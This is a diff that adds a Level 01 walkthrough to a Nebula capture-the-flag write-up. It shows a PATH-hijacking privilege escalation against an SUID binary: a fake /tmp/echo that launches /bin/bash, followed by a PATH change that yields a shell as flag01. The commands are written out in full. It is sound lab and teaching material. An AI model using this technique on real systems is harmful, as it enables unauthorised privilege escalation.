@@ -48,8 +48,35 @@ You have successfully executed getflag on a target account
 ```
 ### Level 01
 
+[Level 01 Description](https://exploit.education/nebula/level-01/)
 
+From inspection of the source code attached to the description we can see that the `flag01` program uses the `system()` function to call `echo` and write 'and now what?' to stdout. 
+```
+level01@nebula:~$ ls -al /home/flag01
+total 13
+drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
+drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
+-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
+-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
+level01@nebula:~$ /home/flag01/flag01
+and now what?
+```
+`flag01` is an SUID application therefore it will run any commands as the flag01 user. The absolute path of `echo` isn't set therefore we can create a fake echo command to give us a shell under the flag01 account.  
 
+To do this we simply create a one line script in `/tmp/echo` which just runs `/bin/bash`. We give the script execute permissions and and /tmp to the PATH.
+```
+level01@nebula:~$ echo /bin/bash > /tmp/echo 
+level01@nebula:~$ chmod +x /tmp/echo
+level01@nebula:~$ export PATH=/tmp:$PATH
+```
+Now when we run `flag01` we drop into a shell under the flag01 account and we can run `getflag`.
+```
+level01@nebula:~$ /home/flag01/flag01 
+flag01@nebula:~$ getflag
+You have successfully executed getflag on a target account
+```
 ### Level 02
 
 
